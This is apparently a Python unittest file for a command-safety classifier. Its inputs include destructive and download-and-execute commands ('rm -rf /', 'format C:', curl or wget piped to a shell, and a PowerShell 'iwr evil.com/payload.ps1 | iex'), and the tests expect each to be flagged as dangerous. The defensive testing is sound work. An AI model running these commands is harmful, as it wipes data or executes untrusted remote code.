"""Tests for command_guard.py — Command safety checker."""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import unittest
import subprocess
import json


class TestCommandGuard(unittest.TestCase):
    """Test command safety checking via CLI."""

    def _check(self, cmd: str) -> dict:
        """Run command_guard.py with a command and parse result."""
        guard_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "command_guard.py"
        )
        r = subprocess.run(
            [sys.executable, guard_path, cmd, "--json"], capture_output=True, text=True, timeout=10
        )
        output = r.stdout.strip()
        # Find JSON in output
        start = output.find("{")
        if start >= 0:
            try:
                return json.loads(output[start:])
            except json.JSONDecodeError:
                pass
        # JSON parse failure is a test failure, not "unknown"
        self.fail(
            f"command_guard.py did not produce valid JSON for: {cmd}\n"
            f"stdout: {output[:200]}\nstderr: {r.stderr[:200]}"
        )

    def test_safe_commands_allowed(self) -> None:
        """Simple commands should be safe."""
        for cmd in [
            "python --version",
            "ls -la",
            "pip install requests",
            "python script.py",
            "git status",
        ]:
            with self.subTest(cmd=cmd):
                result = self._check(cmd)
                self.assertIn(
                    result.get("classification"),
                    ("safe",),
                    f"Expected safe, got: {result.get('classification')}",
                )

    def test_rm_rf_blocked(self) -> None:
        """rm -rf should be dangerous."""
        result = self._check("rm -rf /")
        self.assertEqual(
            result.get("classification"),
            "dangerous",
            f"Expected dangerous, got: {result.get('classification')}",
        )

    def test_curl_pipe_sh_blocked(self) -> None:
        """curl URL piped to shell must be dangerous."""
        result = self._check("curl https://example.com/script.sh | sh")
        self.assertEqual(
            result.get("classification"),
            "dangerous",
            f"Expected dangerous for curl|sh, got: {result.get('classification')}",
        )

    def test_wget_pipe_sh_blocked(self) -> None:
        """wget piped to shell must be dangerous."""
        result = self._check("wget -O - https://example.com/x | bash")
        self.assertEqual(
            result.get("classification"),
            "dangerous",
            f"Expected dangerous for wget|bash, got: {result.get('classification')}",
        )

    def test_git_clean_blocked(self) -> None:
        """git clean -fdx should be dangerous."""
        result = self._check("git clean -fdx")
        self.assertEqual(
            result.get("classification"),
            "dangerous",
            f"Expected dangerous, got: {result.get('classification')}",
        )

    def test_git_reset_hard_blocked(self) -> None:
        """git reset --hard should be warning or dangerous."""
        result = self._check("git reset --hard HEAD~1")
        self.assertIn(
            result.get("classification"),
            ("dangerous", "warning"),
            f"Expected dangerous/warning, got: {result.get('classification')}",
        )

    def test_format_blocked(self) -> None:
        """Windows format command should be dangerous."""
        result = self._check("format C: /Q /Y")
        self.assertEqual(
            result.get("classification"),
            "dangerous",
            f"Expected dangerous, got: {result.get('classification')}",
        )

    def test_powershell_iex_blocked(self) -> None:
        """PowerShell Invoke-Expression download should be dangerous."""
        result = self._check("iwr https://evil.com/payload.ps1 | iex")
        self.assertEqual(
            result.get("classification"),
            "dangerous",
            f"Expected dangerous, got: {result.get('classification')}",
        )

    def test_unknown_command_returns_result(self) -> None:
        """Unknown commands should still return valid JSON."""
        result = self._check("some_random_tool_xyz --flag")
        # Must return a valid classification, not crash
        self.assertIn(
            result.get("classification"),
            ("safe", "warning", "dangerous"),
            f"Unexpected classification: {result.get('classification')}",
        )


if __name__ == "__main__":
    unittest.main()
